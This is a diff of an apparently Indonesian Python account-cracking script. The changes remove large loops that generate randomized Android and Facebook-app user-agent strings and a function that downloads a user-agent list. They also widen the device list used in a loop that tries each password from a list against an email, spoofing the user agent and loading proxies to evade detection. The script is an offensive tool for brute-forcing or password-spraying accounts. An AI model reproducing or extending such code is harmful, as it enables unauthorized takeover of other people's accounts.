@@ -23,90 +23,7 @@ try:
 except Exception as e:
 	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
 prox=open('.prox.txt','r').read().splitlines()
-for xd in range(100000):
-    a='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
-    c=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021'])
-    d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    kk=random.randrange(83,103)
-    buil=random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)'])
-    e=random.choice(['SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
-    g=random.randrange(4200,4900)
-    h=random.randrange(40,150)
-    i='Mobile Safari/537.36'
-    uaku=f'{a} {b}; {c} {buil} {d}{kk}.{g}.{h} {i} {e}'
-    usragent.append(uaku)
-for t in range(100000):
-    a='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
-    c=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021'])
-    d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    kk=random.randrange(83,103)
-    buil=random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)'])
-    e=random.choice(['SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
-    g=random.randrange(4200,4900)
-    h=random.randrange(40,150)
-    i='Mobile Safari/537.36'
-    uakuh=f'{a} {b}; {c} {buil} {d}{kk}.{g}.{h} {i} {e}'
-    uakuh1=f'{a} {b}; {c} {buil} {d}{kk}.{g}.{h} {i} {e}'
-    uaku2 = random.choice([uakuh,uakuh1])
-    usrgent2.append(uaku2)
-	
-for xd in range(10000):
-	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Redmi 4A Build/N2G47H)'
-	e=random.randrange(100, 9999)
-	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
-
-#------------[ UBAH UA DIH SINI OM ]---------------#
-for brayen in range(10000):
-    rr = random.randint
-    rc = random.choice
-    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
-    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1'])
-    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2012K11AG Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Meizu C10 Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    UaMainn = random.choice([u1, u2, u3, u4, u5])
-    ugen.append(UaMainn)
- 
-for x in range(10):
-	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	c=random.randrange(73,100)
-	d=random.randrange(4200,4900)
-	e=random.randrange(40,150)
-	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-    
-for td in range(10):
-    	a=random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','11.1.1','11.4.2','5.1.4','5.0.2','5.1.1'])
-    	b=random.choice(['Nokia C3 Build/QP1A.190711.020; wv)','Archos Oxygen 57 Build/P00610; wv)','RCT6716Q25 Build/QP1A.190711.020; wv)','Z6750M Build/QKQ1.200913.002; wv)','S98Pro Build/SP1A.210812.016; wv)','100026191 Build/RP1A.200720.011; wv)','SC-51B Build/TP1A.220624.014; wv)','ONA19TB003 Build/PPR1.180610.011; wv)','Titan Slim Build/RP1A.200720.011; wv)','TECNO KI5k Build/SP1A.210812.016; wv)','XT1068 Build/LXB22.46-28)','Moto G (5) Plus Build/NPNS25.137-35-5)','oppo 15 )','OPPO 1105 Build/KTU84P)','TECNO KG8 Build/RP1A.200720.011; wv)','TECNO Mobile KG8 Build/RP1A.200720.011; wv)','TECNO KG8 Build/RP1A.200720.011)','vivo Y31 Build/LRX22G)','V2036 Build/SP1A.210812.003; wv)','V2036) AppleWebKit/537.36','Redmi K30 Pro Build/SKQ1.211006.001; wv)','Redmi K30 Pro Build/RKQ1.200826.002; wv)','V2036 Build/TP1A.220624.014; wv)','V2036 Build/SP1A.210812.003; wv)','Redmi K30 Pro Build/SKQ1.211006.001; wv)','Redmi K30 Pro Build/SKQ1.211006.001; wv)','(Windows NT 10.0; Win64; x64)','(Windows NT 10.0; Win64; x64)','(iPhone; CPU iPhone OS 15_4 like Mac OS X)'])
-    	c=random.choice(['Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.22.108;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/386.0.0.19.106;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]','Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]','Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.1.0.25.132;]','Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]','Version/4.0 Chrome/112.0.5615.135 Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]','Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]','Version/4.0 Chrome/112.0.5615.136 Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]','Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Version/4.0 Chrome/113.0.5672.114 Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]','Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]','Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36','Chrome/80.0.3987.87 Mobile Safari/537.36 YaApp_Android/10.30 YaSearchBrowser/10.30','Chrome/76.0.217.77 Mobile Safari/537.36','Chrome/183.0.1444.82 UCBrowser/12.13.4.1214 Mobile Safari/537.36','Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]','Chrome/84.0.4147.89 Mobile Safari/537.36','Chrome/85.0.4183.101 Mobile Safari/537.36','Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/59.1.2926.54067','Chrome/81.0.4044.122 Mobile Safari/537.36','Chrome/83.0.4103.106 Mobile Safari/537.36','Chrome/83.0.4103.101 Mobile Safari/537.36','Chrome/83.0.4103.96 Mobile Safari/537.36','Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/354.0.0.10.113;]','Chrome/108.0.0.0 Mobile Safari/537.36','Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]','Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/379.1.0.23.114;]','Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/343.0.0.13.79;]','Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]','Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/402.0.0.11.101;]','Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/343.0.0.13.79;]','Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/340.0.0.9.76;]','Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.15','Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.15 SP-engine/2.53.0 baiduboxapp/13.15.0.11 (Baidu; P1 12) NABar/1.0','Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.16','Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54 GLS/92.10.9729.30','Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.87','EdgiOS/108.0.1462.62 Version/15.0 Mobile/15E148 Safari/604.1'])
-    	ua1=f"Mozilla/5.0 (Linux; Android {a}; {b} AppleWebKit/537.36 (KHTML, like Gecko) {c}"
-    	ua2=f"Mozilla/5.0 ({b} AppleWebKit/537.36 (KHTML, like Gecko) {c}"
-def uaku():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/Itsmeafriliyan/List-User-Agent/blob/main/list_user-agent.txt').text
-		ua=open('.list_user-agent.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.list_user-agent.txt','r').read().splitlines()
+# Append Crack
 Dump, Looping, Ok, Cp = [], 0, [], []
 # Pilih Metode Crack
 def tanya_metode():
@@ -150,7 +67,7 @@ def main_alpha(total, email, pwx):
     try:
         for password in pwx:
             with requests.Session() as r:
-                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
+                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64', 'Nokia C3 Build/QP1A.190711.020; wv)', 'Archos Oxygen 57 Build/P00610; wv)', 'RCT6716Q25 Build/QP1A.190711.020; wv)', 'Z6750M Build/QKQ1.200913.002; wv)', 'S98Pro Build/SP1A.210812.016; wv)', '100026191 Build/RP1A.200720.011; wv)', 'SC-51B Build/TP1A.220624.014; wv)', 'ONA19TB003 Build/PPR1.180610.011; wv)', 'Titan Slim Build/RP1A.200720.011; wv)', 'TECNO KI5k Build/SP1A.210812.016; wv)', 'XT1068 Build/LXB22.46-28)', 'Moto G (5) Plus Build/NPNS25.137-35-5)', 'oppo 15 )', 'OPPO 1105 Build/KTU84P)', 'TECNO KG8 Build/RP1A.200720.011; wv)', 'TECNO Mobile KG8 Build/RP1A.200720.011; wv)', 'TECNO KG8 Build/RP1A.200720.011)', 'vivo Y31 Build/LRX22G)', 'V2036 Build/SP1A.210812.003; wv)', 'V2036) AppleWebKit/537.36', 'Redmi K30 Pro Build/SKQ1.211006.001; wv)', 'Redmi K30 Pro Build/RKQ1.200826.002; wv)', 'V2036 Build/TP1A.220624.014; wv)', 'V2036 Build/SP1A.210812.003; wv)', 'Redmi K30 Pro Build/SKQ1.211006.001; wv)', 'Redmi K30 Pro Build/SKQ1.211006.001; wv)', '(Windows NT 10.0; Win64; x64)', '(Windows NT 10.0; Win64; x64)', '(iPhone; CPU iPhone OS 15_4 like Mac OS X)'])
                 browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
                 useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
                 r.headers.update({
